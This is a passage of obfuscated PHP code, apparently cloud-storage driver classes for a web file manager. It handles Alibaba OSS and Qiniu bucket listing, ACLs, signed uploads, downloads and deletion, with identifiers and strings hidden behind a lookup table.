($»Ä¶¾„¿[$†Š£·¾‘[83]] as $Äéñ£) { if (!$Äéñ£ || !$Äéñ£[$†Š£·¾‘[76]]) { continue; } $¬˜¯˜§Å[$†Š£·¾‘[76]] += $Äéñ£[$†Š£·¾‘[76]]; } } public function has($„¥†òí, $áá¸ñº = false, $·ÒÊ²Ø‰ = true) { $è©İÈŞâ =& $_SERVER[şÒÁøÒÄ]; $„¥†òí = trim($„¥†òí, $è©İÈŞâ[8]); $Œ´ÄÆË = empty($„¥†òí) && $„¥†òí !== $è©İÈŞâ[198] ? $è©İÈŞâ[12] : $„¥†òí . $è©İÈŞâ[8]; $¨å‘¬¯† = $è©İÈŞâ[12]; $•Òµº¿î = 500; $Ø“ ±ª„ = $¥ş¥‰ÀÆ = 0; while (!0) { check_abort(); $íš‘à¿¤ = array($è©İÈŞâ[1420] => $è©İÈŞâ[8], $è©İÈŞâ[1421] => $Œ´ÄÆË, $è©İÈŞâ[1422] => $•Òµº¿î, $è©İÈŞâ[1423] => $¨å‘¬¯†); try { $‚Œ‚ÓìÓ = $this->client->listObjects($this->bucket, $íš‘à¿¤); } catch (OSS\Core\OssException $âô‰ŸÚ›) { break; } $¨å‘¬¯† = $‚Œ‚ÓìÓ->getNextMarker(); $“Èà¼ıª = $‚Œ‚ÓìÓ->getObjectList(); $Å©õêÅ« = $‚Œ‚ÓìÓ->getPrefixList(); if ($áá¸ñº) { if (count($“Èà¼ıª) > 1 || count($“Èà¼ıª) == 1 && $“Èà¼ıª[0]->getKey() != $Œ´ÄÆË) { $Ø“ ±ª„ += count($“Èà¼ıª) - 1; } if (!empty($Å©õêÅ«)) { $¥ş¥‰ÀÆ += count($Å©õêÅ«); } if ($¨å‘¬¯† === $è©İÈŞâ[12]) { break; } continue; } if ($·ÒÊ²Ø‰) { if (!empty($“Èà¼ıª)) { if (count($“Èà¼ıª) > 1 || $“Èà¼ıª[0]->getKey() != $Œ´ÄÆË) { return !0; } } } else { if (!empty($Å©õêÅ«)) { return !0; } } if ($¨å‘¬¯† === $è©İÈŞâ[12]) { break; } } if ($áá¸ñº) { return array($è©İÈŞâ[207] => $Ø“ ±ª„, $è©İÈŞâ[208] => $¥ş¥‰ÀÆ); } return !1; } public function listAll($î’†¾í) { $¿šÒÕ…§ =& $_SERVER[şÒÁøÒÄ]; $°¶ßËˆå = $this->fileList($î’†¾í, $¿šÒÕ…§[12], !0); $“²Şİˆô = array_to_keyvalue($°¶ßËˆå[$¿šÒÕ…§[83]], $¿šÒÕ…§[32]); foreach ($°¶ßËˆå[$¿šÒÕ…§[82]] as $ÜúÌÖ–º) { if (is_string($ÜúÌÖ–º)) { $“²Şİˆô[$ÜúÌÖ–º] = array($¿šÒÕ…§[76] => 0); } } return $this->listAllFiles($î’†¾í, $“²Şİˆô); } public function canRead($ÔÈ…Øè) { $¬’÷ÛÃı =& $_SERVER[şÒÁøÒÄ]; $£¾×‚Şş = $this->pathAcl($ÔÈ…Øè); return $£¾×‚Şş == $¬’÷ÛÃı[1433] || $£¾×‚Şş == $¬’÷ÛÃı[547] ? !0 : !1; } public function canWrite($¯ùÛâ) { $Á€¿Õ˜ = $this->pathAcl($¯ùÛâ); return $Á€¿Õ˜ == $_SERVER[şÒÁøÒÄ][547] ? !0 : !1; } public function pathAcl($Æ•¼…Å§) { $‡ğıŸ“ =& $_SERVER[şÒÁøÒÄ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ˆã§“Îı = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Æ•¼…Å§)); } catch (OSS\Core\OssException $’¯ôá¥ª) { return !1; } $¿ÒéâŸ = $ˆã§“Îı == $‡ğıŸ“[37] ? $this->bucketAcl : $ˆã§“Îı; if ($¿ÒéâŸ == $‡ğıŸ“[1434]) { return $‡ğıŸ“[1433]; } if ($¿ÒéâŸ == $‡ğıŸ“[1435]) { return $‡ğıŸ“[547]; } return $¿ÒéâŸ; } private function chmodPath($öÌ²ÊÓ, $İú³ÀÅ× = '') { $³İıè˜¾ =& $_SERVER[şÒÁøÒÄ]; $·Œë£© = empty($İú³ÀÅ×) ? $³İıè˜¾[1435] : $İú³ÀÅ×; $åûÛÍæŒ = array($³İıè˜¾[37], $³İıè˜¾[199], $³İıè˜¾[1434], $³İıè˜¾[1435]); if (!in_array($·Œë£©, $åûÛÍæŒ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($öÌ²ÊÓ), $·Œë£©); } catch (OSS\Core\OssException $€¯–Ÿ‰¥) { return !1; } return !0; } public function getContent($“–ºŞ¿Œ) { return $this->fileSubstr($“–ºŞ¿Œ, -1); } public function setContent($æÇŠÅæË, $¢½ÅÒí¡ = '') { $ÙÙÏ« =& $_SERVER[şÒÁøÒÄ]; try { $‰Øşˆ± = $this->trafficLimit($ÙÙÏ«[1436]); $´‘ãÃËŞ = $this->client->putObject($this->bucket, $this->pathEncode($æÇŠÅæË), $¢½ÅÒí¡, $‰Øşˆ±); } catch (OSS\Core\OssException $®»¿õø) { return !1; } $şøõæ´à = array($ÙÙÏ«[1426] => trim($´‘ãÃËŞ[$ÙÙÏ«[1437]], $ÙÙÏ«[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($æÇŠÅæË))); $this->updateObjMeta($æÇŠÅæË, $şøõæ´à); return isset($´‘ãÃËŞ[$ÙÙÏ«[1438]][$ÙÙÏ«[1385]]) ? !0 : !1; } private function updateObjMeta($ìÊïí‘Ì, $Ô‡¾ıªõ) { $ìÊïí‘Ì = $this->pathEncode($ìÊïí‘Ì); try { $Î ï’ê = array(OSS\OssClient::OSS_HEADERS => $Ô‡¾ıªõ); $this->client->copyObject($this->bucket, $ìÊïí‘Ì, $this->bucket, $ìÊïí‘Ì, $Î ï’ê); } catch (OSS\Core\OssException $ùœŠ­˜¨) { return !1; } return !0; } public function upload($ÒØËÙæ, $»É¢‡Ş°, $ÓÛµ„Ö = false, $¥§¯¸ÇÔ = REPEAT_REPLACE) { $„×³ßˆä =& $_SERVER[şÒÁøÒÄ]; $çŸ­üÚú = trim($ÒØËÙæ, $„×³ßˆä[8]); $¤í¶àı = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($„×³ßˆä[1426] => @md5_file($»É¢‡Ş°)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ÒØËÙæ))); $¤í¶àı = $this->trafficLimit($„×³ßˆä[1436], $¤í¶àı); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($çŸ­üÚú), $»É¢‡Ş°, $¤í¶àı); } catch (OSS\Core\OssException $Œµ…Ãà) { return !1; } return $this->getPathOuter($ÒØËÙæ); } public function getHost() { $°£¾£ĞŒ =& $_SERVER[şÒÁøÒÄ]; $Î…­êØù = explode($°£¾£ĞŒ[184], parent::getHost()); return $Î…­êØù[0] . $°£¾£ĞŒ[184] . $this->bucket . $°£¾£ĞŒ[10] . $Î…­êØù[1]; } public function uploadFormData($á«Ø‘É, $ò©ß¤ŠÀ = 3600) { $ı»§Û·„ =& $_SERVER[şÒÁøÒÄ]; if (!($•Â—Ê = $this->getHost())) { return !1; } $Ë£ºıÂß = $ò©ß¤ŠÀ; $§†Ä‡çŒ = date($ı»§Û·„[1439], time() + $Ë£ºıÂß); $Ş€É™ú = new DateTime($§†Ä‡çŒ); $®îõËÜ³ = $Ş€É™ú->format(DateTime::ISO8601); $Î÷ïÚå¹ = strpos($®îõËÜ³, $ı»§Û·„[296]); $®îõËÜ³ = substr($®îõËÜ³, 0, $Î÷ïÚå¹) . $ı»§Û·„[1440]; $Ğ÷ÚØœè = 1048576000 * 5; $ÓÉØş¯ = $this->pathFather($á«Ø‘É); $ÜØ¬Ö…õ = array($ı»§Û·„[1337] => $®îõËÜ³, $ı»§Û·„[1338] => array(array($ı»§Û·„[1441], 0, $Ğ÷ÚØœè), array($ı»§Û·„[1341], $ı»§Û·„[1342], $ÓÉØş¯))); $™å¶Ïúâ = base64_encode(json_encode($ÜØ¬Ö…õ)); $ŠûŠƒ¥Ú = base64_encode(hash_hmac($ı»§Û·„[232], $™å¶Ïúâ, $this->secret, !0)); $Öô×ø£‚ = array($ı»§Û·„[1347] => $™å¶Ïúâ, $ı»§Û·„[1442] => $this->accessKey, $ı»§Û·„[1343] => $ı»§Û·„[1335], $ı»§Û·„[1443] => $ŠûŠƒ¥Ú, $ı»§Û·„[182] => $•Â—Ê); $Öô×ø£‚ = $this->trafficLimit($ı»§Û·„[1436], $Öô×ø£‚); return $Öô×ø£‚; } public function multiUploadFormData($ Ïö×—õ, $çâÄêä = 3600) { $ÑÎÔ¶†¼ =& $_SERVER[şÒÁøÒÄ]; if (!($úÂîÖÙ› = $this->getHost())) { return !1; } $¼ÏˆşŞĞ = $this->trafficLimit($ÑÎÔ¶†¼[1436]); $Å¾‹°ÈÉ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ Ïö×—õ), $¼ÏˆşŞĞ); return array($ÑÎÔ¶†¼[223] => $Å¾‹°ÈÉ, $ÑÎÔ¶†¼[182] => $úÂîÖÙ› . $ÑÎÔ¶†¼[8] . $this->pathEncode($ Ïö×—õ), $ÑÎÔ¶†¼[224] => gmdate($ÑÎÔ¶†¼[1444]), $ÑÎÔ¶†¼[94] => $ Ïö×—õ); } public function multiUploadAuthData($Ü©·õæ¯, $‚ş£ŠŞ¯ = array()) { $· ‹Íé =& $_SERVER[şÒÁøÒÄ]; $ËñêòÕØ = isset($‚ş£ŠŞ¯[$· ‹Íé[224]]) ? $‚ş£ŠŞ¯[$· ‹Íé[224]] : gmdate($· ‹Íé[1444]); $è¡µæğ¯ = isset($‚ş£ŠŞ¯[$· ‹Íé[174]]) ? $‚ş£ŠŞ¯[$· ‹Íé[174]] : $· ‹Íé[12]; $¬ÒŒÑûğ = $Ü©·õæ¯; if (isset($‚ş£ŠŞ¯[$· ‹Íé[94]])) { $¬ÒŒÑûğ = $‚ş£ŠŞ¯[$· ‹Íé[94]]; unset($‚ş£ŠŞ¯[$· ‹Íé[94]]); } if (isset($‚ş£ŠŞ¯[$· ‹Íé[225]])) { $‚ş£ŠŞ¯[$· ‹Íé[224]] = $ËñêòÕØ; return $this->listUploadParts($¬ÒŒÑûğ, $‚ş£ŠŞ¯); } $ğŠËÜ = array($· ‹Íé[226], $· ‹Íé[12], $· ‹Íé[120], $ËñêòÕØ, "\x78\55\x6f\163\163\55\144\x61\164\145\x3a{$ËñêòÕØ}", $· ‹Íé[8] . $this->bucket . $· ‹Íé[8] . $¬ÒŒÑûğ . $è¡µæğ¯); if (strpos($è¡µæğ¯, $· ‹Íé[227]) === 0) { $ğŠËÜ[0] = $· ‹Íé[228]; if ($ÜÙŸÍ€ö = $this->trafficLimit($· ‹Íé[1436])) { $¬ÒŒÑûğ = $· ‹Íé[1445]; array_splice($ğŠËÜ, 5, 0, $¬ÒŒÑûğ . $· ‹Íé[4] . $ÜÙŸÍ€ö[$¬ÒŒÑûğ]); } } if (isset($‚ş£ŠŞ¯[$· ‹Íé[229]]) && $‚ş£ŠŞ¯[$· ‹Íé[229]] == $· ‹Íé[230]) { $ğŠËÜ[0] = $· ‹Íé[230]; } if (!empty($‚ş£ŠŞ¯[$· ‹Íé[1446]])) { $Ê¤Øß¹Ó = array_merge(array($ğŠËÜ[4]), $‚ş£ŠŞ¯[$· ‹Íé[1446]]); sort($Ê¤Øß¹Ó); $ğŠËÜ[4] = implode($· ‹Íé[231], $Ê¤Øß¹Ó); } $÷ƒÄ²Ñû = implode($· ‹Íé[231], $ğŠËÜ); $€õß·ü½ = base64_encode(hash_hmac($· ‹Íé[232], $÷ƒÄ²Ñû, $this->secret, !0)); $‹¸Ö¯µ© = $· ‹Íé[1410] . $this->accessKey . $· ‹Íé[4] . $€õß·ü½; if (strpos($è¡µæğ¯, $· ‹Íé[227]) === 0) { $‹¸Ö¯µ© = array($· ‹Íé[234] => $‹¸Ö¯µ©, $· ‹Íé[224] => $ËñêòÕØ); if ($ÜÙŸÍ€ö) { $‹¸Ö¯µ© = array_merge($‹¸Ö¯µ©, $ÜÙŸÍ€ö); } } return $‹¸Ö¯µ©; } public function listUploadParts($¼ˆıœ¤´, $şÃŠäˆ) { $œƒÑÍä =& $_SERVER[şÒÁøÒÄ]; $î†…”½Û = parse_url_query($şÃŠäˆ[$œƒÑÍä[174]]); $ÀÃª«®” = $this->client->listParts($this->bucket, $this->pathEncode($¼ˆıœ¤´), $î†…”½Û[$œƒÑÍä[223]]); $ì«Ğ«‘ş = $ÀÃª«®”->getListPart(); $‘ß‘öŸ¢ = array(); foreach ($ì«Ğ«‘ş as $íİĞ•À¯) { $‘ß‘öŸ¢[] = array($œƒÑÍä[1430] => $íİĞ•À¯->getPartNumber(), $œƒÑÍä[1431] => trim($íİĞ•À¯->getETag(), $œƒÑÍä[118])); } unset($şÃŠäˆ[$œƒÑÍä[225]], $şÃŠäˆ[$œƒÑÍä[229]]); $‰İä¼ç = $this->multiUploadAuthData($¼ˆıœ¤´, $şÃŠäˆ); if (empty($‰İä¼ç)) { return !1; } return array($œƒÑÍä[234] => $‰İä¼ç, $œƒÑÍä[224] => $şÃŠäˆ[$œƒÑÍä[224]], $œƒÑÍä[236] => $‘ß‘öŸ¢); } public function download($ÉëÖÉÚ, $ºøÉœÛ¡) { if ($this->isFolder($ÉëÖÉÚ)) { return !1; } try { $òåäîƒ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ºøÉœÛ¡); $òåäîƒ = $this->trafficLimit($_SERVER[şÒÁøÒÄ][109], $òåäîƒ); $this->client->getObject($this->bucket, $this->pathEncode($ÉëÖÉÚ), $òåäîƒ); } catch (OSS\Core\OssException $††èƒµ¾) { return !1; } return $ºøÉœÛ¡; } public function fileSubstr($ƒéªáÎ, $–ñ»¸°’ = 0, $ßÃ¤¢­ª = false) { if ($–ñ»¸°’ === -1) { $ÌŒåÃ§ = array(); } else { if ($ßÃ¤¢­ª === !1) { $ÆÇì¯£É = $this->size($ƒéªáÎ); } else { $ÆÇì¯£É = $–ñ»¸°’ + $ßÃ¤¢­ª - 1; } $ÌŒåÃ§ = array(OSS\OssClient::OSS_RANGE => "{$–ñ»¸°’}\x2d{$ÆÇì¯£É}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ƒéªáÎ), $ÌŒåÃ§); } catch (OSS\Core\OssException $  ™¼Ô) { think_exception($  ™¼Ô->getMessage()); return !1; } } private function trafficLimit($±èà³ç‹, $ºï†­¨ = array()) { $”¡Äúø‹ =& $_SERVER[şÒÁøÒÄ]; if ($±èà³ç‹ == $”¡Äúø‹[1436] && $this->isUploadServer() || $±èà³ç‹ == $”¡Äúø‹[109] && $this->isFileOutServer()) { return $ºï†­¨; } $ÊĞÓŸ¸Ø = floatval($GLOBALS[$”¡Äúø‹[6]][$”¡Äúø‹[89]][$”¡Äúø‹[107]][$±èà³ç‹]) * 1024 * 1024 * 8; if (!$ÊĞÓŸ¸Ø) { return $ºï†­¨; } $ÊĞÓŸ¸Ø = $ÊĞÓŸ¸Ø < 819200 ? 819200 : ($ÊĞÓŸ¸Ø > 838860800 ? 838860800 : $ÊĞÓŸ¸Ø); $ºï†­¨[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ÊĞÓŸ¸Ø); return $ºï†­¨; } public function link($óÏ©±¬¥, $·‘äÙô = array()) { $ÔÒ‰¬—· =& $_SERVER[şÒÁøÒÄ]; if (!$this->exist($óÏ©±¬¥) || $this->isFolder($óÏ©±¬¥)) { return !1; } try { $·‘äÙô = $this->trafficLimit($ÔÒ‰¬—·[109], $·‘äÙô); $µñ…»¾« = $this->client->signUrl($this->bucket, $this->pathEncode($óÏ©±¬¥), 3600 * 12, $ÔÒ‰¬—·[230], $·‘äÙô); return $this->getCdnLink($µñ…»¾«); } catch (OSS\Core\OssException $êÈ½øä±) { return !1; } } public function fileOut($–êö•¶, $„éï‰‹ = false, $üúõœû = false, $ÒÎ„óÓ” = '') { $–ô©¬¸Ÿ =& $_SERVER[şÒÁøÒÄ]; if ($this->isFileOutServer()) { return $this->fileOutServer($–êö•¶, $„éï‰‹, $üúõœû, $ÒÎ„óÓ”); } if (!$üúõœû) { $üúõœû = $this->pathThis($–êö•¶); } $üúõœû = rawurlencode($üúõœû); $Ä˜·ÆÓ = get_file_mime(get_path_ext($üúõœû)); if ($Ä˜·ÆÓ == $–ô©¬¸Ÿ[217]) { return parent::fileOut($–êö•¶, $„éï‰‹, $üúõœû, $ÒÎ„óÓ”); } $„éï‰‹ = $„éï‰‹ ? $–ô©¬¸Ÿ[1447] : $–ô©¬¸Ÿ[1448]; $Ïøû¯Õ = array(OSS\OssClient::OSS_SUB_RESOURCE => $–ô©¬¸Ÿ[1449] . rawurlencode("{$„éï‰‹}\73\146\151\154\145\156\141\x6d\x65\75{$üúõœû}")); $Ïøû¯Õ[OSS\OssClient::OSS_SUB_RESOURCE] .= $–ô©¬¸Ÿ[1450] . rawurlencode($Ä˜·ÆÓ); $”è†Ğ–€ = $this->link($–êö•¶, $Ïøû¯Õ); $this->fileOutLink($”è†Ğ–€); } public function fileOutServer($‹÷ññ·Î, $ŠÓˆî¾Å = false, $ İÒŞ§‰ = false, $øÚ–­¾® = '') { parent::fileOut($‹÷ññ·Î, $ŠÓˆî¾Å, $ İÒŞ§‰, $øÚ–­¾®); } public function fileOutImage($Ó‡Î˜˜, $‹éÖ«Õ¤ = 250) { $¤éÀÊâí = array(OSS\OssClient::OSS_PROCESS => $_SERVER[şÒÁøÒÄ][1451] . $‹éÖ«Õ¤); $Òç¼³‹˜ = $this->link($Ó‡Î˜˜, $¤éÀÊâí); $this->fileOutLink($Òç¼³‹˜); } public function fileOutImageServer($ˆÊòŒÂÆ, $øã®øı‰ = 250) { parent::fileOutImage($ˆÊòŒÂÆ, $øã®øı‰); } public function fileOutLink($Ìã¨ ’) { $Äüº¼æ =& $_SERVER[şÒÁøÒÄ]; if (!$this->isCdnHost() && substr($Ìã¨ ’, 0, 7) == $Äüº¼æ[1350]) { $Ìã¨ ’ = $Äüº¼æ[1351] . substr($Ìã¨ ’, 7); } header($Äüº¼æ[161] . $Ìã¨ ’); die; } public function hashMd5($ÖÒÍ“ë”, $¿áØş±÷ = '') { $§ã°â =& $_SERVER[şÒÁøÒÄ]; $ŞÅ¡Ÿ¢® = $this->_objectMeta($ÖÒÍ“ë”); if (!$ŞÅ¡Ÿ¢®) { return $§ã°â[12]; } if (!isset($ŞÅ¡Ÿ¢®[$§ã°â[1426]]) && !empty($¿áØş±÷)) { $äó©ÌÒ¢ = $this->updateObjMeta($ÖÒÍ“ë”, array($§ã°â[1426] => $¿áØş±÷)); $ŞÅ¡Ÿ¢®[$§ã°â[1426]] = $äó©ÌÒ¢ ? $¿áØş±÷ : $§ã°â[12]; } return isset($ŞÅ¡Ÿ¢®[$§ã°â[1426]]) ? strtolower($ŞÅ¡Ÿ¢®[$§ã°â[1426]]) : $§ã°â[12]; } public function size($ÙÖÁšª×) { $şêµ¹âä = $this->objectMeta($ÙÖÁšª×); return $şêµ¹âä ? $şêµ¹âä[$_SERVER[şÒÁøÒÄ][76]] : 0; } public function info($ø—ß´‹´) { if ($this->isFolder($ø—ß´‹´)) { return $this->folderInfo($ø—ß´‹´); } else { if ($this->isFile($ø—ß´‹´)) { return $this->fileInfo($ø—ß´‹´); } } return !1; } public function exist($ûŠ—¡ô) { return $this->isFile($ûŠ—¡ô) || $this->isFolder($ûŠ—¡ô); } public function isFile($ß·İ©³Ë) { return !$this->isFolder($ß·İ©³Ë) && $this->objectMeta($ß·İ©³Ë); } public function isFolder($‰Ø©†úà) { return $this->cacheMethod($_SERVER[şÒÁøÒÄ][165], $‰Ø©†úà); } protected function objectMeta($–ˆ—Å¬€) { return $this->cacheMethod($_SERVER[şÒÁøÒÄ][167], $–ˆ—Å¬€); } protected function _objectMeta($æó„Ÿ÷´) { $³Òüô´ =& $_SERVER[şÒÁøÒÄ]; try { $ë”çêÓ® = $this->client->getObjectMeta($this->bucket, $this->pathEncode($æó„Ÿ÷´)); } catch (OSS\Core\OssException $¯ø¦˜šô) { $ë”çêÓ® = !1; } if ($ë”çêÓ®) { $ë”çêÓ®[$³Òüô´[76]] = intval($ë”çêÓ®[$³Òüô´[1424]]); } return $ë”çêÓ®; } protected function _isFolder($¯õ®ë¿Œ) { $¤×“É½ñ =& $_SERVER[şÒÁøÒÄ]; if ($¯õ®ë¿Œ == $¤×“É½ñ[12] || $¯õ®ë¿Œ == $¤×“É½ñ[8]) { return !0; } $ğÃ¬Üíğ = array($¤×“É½ñ[1420] => $¤×“É½ñ[8], $¤×“É½ñ[1421] => rtrim($¯õ®ë¿Œ, $¤×“É½ñ[8]) . $¤×“É½ñ[8], $¤×“É½ñ[1422] => 1, $¤×“É½ñ[1423] => $¤×“É½ñ[12]); $ğò˜€Õ‰ = $this->client->listObjects($this->bucket, $ğÃ¬Üíğ); if ($ğò˜€Õ‰->getObjectList() || $ğò˜€Õ‰->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ŠË×«ÚŞ) { parent::__construct(); require_once SDK_DIR . $_SERVER[şÒÁøÒÄ][1452]; $this->_init($ŠË×«ÚŞ); } public function _init($…äÀÓ·«) { $±íûüËÔ =& $_SERVER[şÒÁøÒÄ]; $this->config = $…äÀÓ·«; foreach ($…äÀÓ·« as $•¥ôí‚¸ => $ÒÀÒƒÏ‹) { if (isset($this->{$•¥ôí‚¸})) { $this->{$•¥ôí‚¸} = $ÒÀÒƒÏ‹; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($±íûüËÔ[1453] . LNG($±íûüËÔ[1411])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ËÈÚÉÈÈ, $‚¿ƒôÀ™ = '', $¥Ë§ÁÇ“ = REPEAT_RENAME) { if ($this->setContent($ËÈÚÉÈÈ, $‚¿ƒôÀ™)) { return $this->getPathOuter($ËÈÚÉÈÈ); } return !1; } public function mkdir($„©°¬Ş, $ñàâÚÜ… = REPEAT_SKIP) { $…Ç¸ò†¥ =& $_SERVER[şÒÁøÒÄ]; $ìô‰¸Ø¡ = trim($„©°¬Ş, $…Ç¸ò†¥[8]); if ($this->_isFolder($ìô‰¸Ø¡)) { return $this->getPathOuter($ìô‰¸Ø¡); } $„©°¬Ş = $ìô‰¸Ø¡ . $…Ç¸ò†¥[8]; $ÔÁñãıÔ = get_path_this($ìô‰¸Ø¡); $™¦¼›İ = $„©°¬Ş . $ÔÁñãıÔ; if (!$this->mkfile($™¦¼›İ)) { return !1; } if (!$this->moveFile($™¦¼›İ, $„©°¬Ş)) { $this->delFile($™¦¼›İ); return !1; } return $this->getPathOuter($ìô‰¸Ø¡); } public function copyFile($„ò¦ïÚÙ, $äó‡²ÂŠ) { $âıâ¸Ş = $this->bucketManager->copy($this->bucket, $„ò¦ïÚÙ, $this->bucket, $äó‡²ÂŠ, !0); return $âıâ¸Ş ? !1 : $this->getPathOuter($äó‡²ÂŠ); } public function moveFile($£¹Ş…õø, $¬åã·÷Ë) { $¢úîø = $this->bucketManager->move($this->bucket, $£¹Ş…õø, $this->bucket, $¬åã·÷Ë, !0); return $¢úîø ? !1 : $this->getPathOuter($¬åã·÷Ë); } public function delFile($®ùò) { if (!$this->exist($®ùò)) { return !0; } $øÈ¬—ßç = $this->bucketManager->delete($this->bucket, $®ùò); return $øÈ¬—ßç ? !1 : !0; } public function delFolder($ìô©ùŠ—) { $¬ı†àÖ =& $_SERVER[şÒÁøÒÄ]; if (!$this->exist($ìô©ùŠ—)) { return !0; } $this->listItemCache = !1; $ü“ÚüĞ = $this->fileList($ìô©ùŠ—); $this->listItemCache = !0; $÷ÃßĞ¶ø = trim($ìô©ùŠ—, $¬ı†àÖ[8]) . $¬ı†àÖ[8]; if (!empty($ìô©ùŠ—) && $ìô©ùŠ— !== $¬ı†àÖ[198] && !in_array($÷ÃßĞ¶ø, $ü“ÚüĞ[$¬ı†àÖ[82]])) { $ü“ÚüĞ[$¬ı†àÖ[82]][] = $÷ÃßĞ¶ø; } $õäÔ…ãª = $this->delByBatch($ü“ÚüĞ[$¬ı†àÖ[83]]); if (!$õäÔ…ãª) { return !1; } $õäÔ…ãª = $this->delByBatch($ü“ÚüĞ[$¬ı†àÖ[82]]); if (!$õäÔ…ãª) { return !1; } return $this->delFile($÷ÃßĞ¶ø); } private function delByBatch($†ğ±ìÓÂ) { foreach (array_chunk($†ğ±ìÓÂ, 1000) as $Ø±¡¥ˆå) { $ÉĞ‘ìòÙ = $this->bucketManager->buildBatchDelete($this->bucket, $Ø±¡¥ˆå); list($½È”×¶Ï, $ŸÍ¶Ñ«) = $this->bucketManager->batch($ÉĞ‘ìòÙ); if ($ŸÍ¶Ñ«) { return !1; } } return !0; } public function rename($‘ÕÎÛ‚í, $ÂâÎÂ¶²) { return $this->renameObject($‘ÕÎÛ‚í, $ÂâÎÂ¶²); } public function fileInfo($ƒÀ­Áí, $àÅŒµªÎ = false, $üıÙ§Ï = array()) { $åìÅƒÀå =& $_SERVER[şÒÁøÒÄ]; $û¼œË = array($åìÅƒÀå[32] => $this->pathThis($ƒÀ­Áí), $åìÅƒÀå[84] => $this->getPathOuter($åìÅƒÀå[8] . $ƒÀ­Áí), $åìÅƒÀå[33] => $åìÅƒÀå[200], $åìÅƒÀå[76] => isset($üıÙ§Ï[$åìÅƒÀå[1454]]) ? $üıÙ§Ï[$åìÅƒÀå[1454]] : 0, $åìÅƒÀå[174] => $this->ext($ƒÀ­Áí)); if ($àÅŒµªÎ) { return $û¼œË; } $û¼œË[$åìÅƒÀå[201]] = $û¼œË[$åìÅƒÀå[85]] = 0; $û¼œË[$åìÅƒÀå[202]] = $û¼œË[$åìÅƒÀå[203]] = !0; if (empty($üıÙ§Ï)) { $üıÙ§Ï = $this->objectMeta($ƒÀ­Áí); if (!$üıÙ§Ï) { return $û¼œË; } } if (isset($üıÙ§Ï[$åìÅƒÀå[1455]])) { $û¼œË[$åìÅƒÀå[85]] = substr($üıÙ§Ï[$åìÅƒÀå[1455]] . $åìÅƒÀå[12], 0, 10); } if (isset($üıÙ§Ï[$åìÅƒÀå[1454]])) { $û¼œË[$åìÅƒÀå[76]] = $üıÙ§Ï[$åìÅƒÀå[1454]]; } return $û¼œË; } public function folderInfo($¶ôœæ…, $¸áÏŸ»ò = false) { $•ÃÆ¥Ó =& $_SERVER[şÒÁøÒÄ]; $êÄ „œ = array($•ÃÆ¥Ó[32] => $this->pathThis($¶ôœæ…), $•ÃÆ¥Ó[84] => $this->getPathOuter($•ÃÆ¥Ó[8] . $¶ôœæ…), $•ÃÆ¥Ó[33] => $•ÃÆ¥Ó[75]); if ($¸áÏŸ»ò) { return $êÄ „œ; } $êÄ „œ[$•ÃÆ¥Ó[201]] = $êÄ „œ[$•ÃÆ¥Ó[85]] = 0; $êÄ „œ[$•ÃÆ¥Ó[202]] = $êÄ „œ[$•ÃÆ¥Ó[203]] = !0; $¶ôœæ… = rtrim($¶ôœæ…, $•ÃÆ¥Ó[8]) . $•ÃÆ¥Ó[8]; $í­áÌ–Ç = $this->objectMeta($¶ôœæ…); if (isset($í­áÌ–Ç[$•ÃÆ¥Ó[1455]])) { $êÄ „œ[$•ÃÆ¥Ó[85]] = substr($í­áÌ–Ç[$•ÃÆ¥Ó[1455]] . $•ÃÆ¥Ó[12], 0, 10); } return $êÄ „œ; } public function listPath($ÏÜöŸ»á, $ƒä®¨¤ø = false) { $å±© Å =& $_SERVER[şÒÁøÒÄ]; $ÌŞ÷Üš¤ = $this->fileList($ÏÜöŸ»á, $å±© Å[8], !0); foreach ($ÌŞ÷Üš¤[$å±© Å[82]] as $¥‘Ş®ÌÖ => $õŞŸºã¿) { $ÌŞ÷Üš¤[$å±© Å[82]][$¥‘Ş®ÌÖ] = $this->folderInfo($õŞŸºã¿, $ƒä®¨¤ø); } foreach ($ÌŞ÷Üš¤[$å±© Å[83]] as $¥‘Ş®ÌÖ => $õŞŸºã¿) { $ÌŞ÷Üš¤[$å±© Å[83]][$¥‘Ş®ÌÖ] = $this->fileInfo($õŞŸºã¿[$å±© Å[94]], $ƒä®¨¤ø, $õŞŸºã¿); } return $ÌŞ÷Üš¤; } public function has($Å½Û‡Ë¿, $¹…Í¨Ú = false, $ß´ïóìÄ = true) { $ÑÊĞŒÊæ =& $_SERVER[şÒÁøÒÄ]; $Å½Û‡Ë¿ = trim($Å½Û‡Ë¿, $ÑÊĞŒÊæ[8]); $†Ùûİ¼õ = empty($Å½Û‡Ë¿) && $Å½Û‡Ë¿ !== $ÑÊĞŒÊæ[198] ? $ÑÊĞŒÊæ[12] : $Å½Û‡Ë¿ . $ÑÊĞŒÊæ[8]; $­åˆöÖ± = $ÑÊĞŒÊæ[12]; $ë«ÔÈş = 500; $èã„€÷– = $ÑÊĞŒÊæ[8]; $ùäÏÊ±Ã = $ïÀµû»æ = 0; while (!0) { check_abort(); list($åÈËİ¶, $ÂÂıÉ¶) = $this->bucketManager->listFiles($this->bucket, $†Ùûİ¼õ, $­åˆöÖ±, 